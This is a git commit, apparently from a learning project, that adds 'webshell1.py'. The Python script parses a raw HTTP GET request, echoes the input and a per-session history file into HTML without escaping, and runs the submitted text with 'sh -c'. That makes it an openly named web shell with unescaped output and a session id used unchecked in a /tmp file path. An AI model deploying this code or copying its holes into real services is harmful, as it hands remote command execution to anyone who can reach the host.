640e53770bfc9c5bf5e5671a6bf006a6166bb579
abittel <abittel@example.com>
2022-04-09 17:47:30 +0200

    add webshell1

---
+++ Axel/webshell1.py
@@ -0,0 +1,75 @@
+import json
+import os
+import sys
+
+res = """
+HTTP/1.1 200 
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 1000
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hello, world!</title>
+</head>
+<body>
+	$(HISTORY)<br>
+	$(DATA)<br>
+	<form action="ajoute$(ID_SESSION)" method="get">
+		<input type="text" name="saisie" placeholder="Tapez quelque chose" />
+		<input type="submit" name="send" value="&#9166;">
+	</form>
+</body>
+</html>
+""" 
+def escaped_latin1_to_utf8(s):
+	res = ''
+	i = 0
+	while i < len(s):
+		if s[i] == '%':
+			res += chr(int(s[i+1:i+3], base=16))
+			i += 3
+		else :
+			res += s[i]
+		i += 1
+	return res
+
+def	get_cmd() :
+	id_session = ''
+	msg = os.read(0, 100000)
+	if (msg.decode('utf8').split("\r")[0].split(' ')[0] != "GET" or msg.decode('utf8').split('\r')[0].split(' ')[2] != 'HTTP/1.1') :
+		os.write(2, b"request not supported\n")
+	else :
+		
+		#EXTRACT DATA
+		data = ''
+		if (len(msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")) > 1) :
+			data = msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")[1].split("&")[0].split("=")[1].replace('+', ' ')
+			data = escaped_latin1_to_utf8(data)
+		if (len(msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")) > 1) :
+			id_session = msg.decode('utf8').split("\r")[0].split(' ')[1].split("?")[0].replace("ajoute", "").replace("/", "")
+		#CREATE RETURN PAQUET
+		msg = res.replace("$(DATA)", data)
+		if (len(id_session) == 0) :
+			id_session = str(os.getpid())
+		msg = msg.replace("$(ID_SESSION)", id_session)
+		#Extract HISTORY
+		fd = os.open("/tmp/historique" + str(id_session) + ".txt", os.O_CREAT | os.O_APPEND | os.O_RDWR)
+		read = os.read(fd, 100000)
+		history =  ''
+		while (len(read) > 0) :
+			history += read.decode('utf8')
+			read = os.read(fd, 100000)
+		msg = msg.replace("$(HISTORY)", history.replace("\n", "<br>"))
+		os.write(1, bytes(msg, 'utf8'))
+		#WRITE IN HISTORY
+		if (len(data) > 0) :
+			os.write(fd, bytes(data,'utf8'))
+			os.write(fd, bytes('\n', 'utf8'))
+		os.close(fd)
+		return (data, history)
+	exit (0)
+if __name__ == "__main__" :
+	data, history = get_cmd()
+	os.execvp('sh', ['sh','-c', data])
